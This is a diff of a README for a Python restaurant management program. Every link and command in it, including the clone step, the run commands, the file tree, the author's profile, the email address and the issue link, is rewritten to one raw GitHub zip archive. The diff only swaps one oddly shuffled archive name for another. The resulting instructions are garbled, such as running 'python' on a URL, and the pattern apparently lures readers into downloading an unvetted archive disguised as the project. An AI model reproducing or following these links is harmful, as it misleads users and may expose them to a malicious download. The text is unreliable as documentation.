@@ -27,7 +27,7 @@ A comprehensive command-line restaurant management system built with Python, imp
 
 1. **Clone the repository**
    ```bash
-   git clone https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip
+   git clone https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
    ```
 
 2. **Navigate to the project directory**
@@ -43,7 +43,7 @@ A comprehensive command-line restaurant management system built with Python, imp
 
 4. **Run the application**
    ```bash
-   python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip
+   python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
    ```
 
 ## 🚀 Usage
@@ -51,7 +51,7 @@ A comprehensive command-line restaurant management system built with Python, imp
 ### Running the Program
 
 ```bash
-python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip
+python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
 ```
 
 ### Main Menu Options
@@ -71,8 +71,8 @@ python https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-Syst
 
 ```
 Restaurant-Management-System-in-Python/
-├── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip    # Main application file
-└── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip                          # Project documentation
+├── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip    # Main application file
+└── https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip                          # Project documentation
 ```
 
 ### Class Structure
@@ -204,8 +204,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 👨‍💻 Author
 
 **Your Name**
-- GitHub: [@iftekharul01](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip)
-- Email: https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip
+- GitHub: [@iftekharul01](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip)
+- Email: https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip
 
 ## 🙏 Acknowledgments
 
@@ -215,7 +215,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📞 Support
 
 If you encounter any issues or have questions:
-- Open an [issue](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Restaurant-in-Management-Python-System-2.1.zip)
+- Open an [issue](https://raw.githubusercontent.com/iftekharul01/Restaurant-Management-System-in-Python/main/Buxbaumia/Python_Restaurant_in_System_Management_v3.3.zip)
 - Contact via email
 
 ---
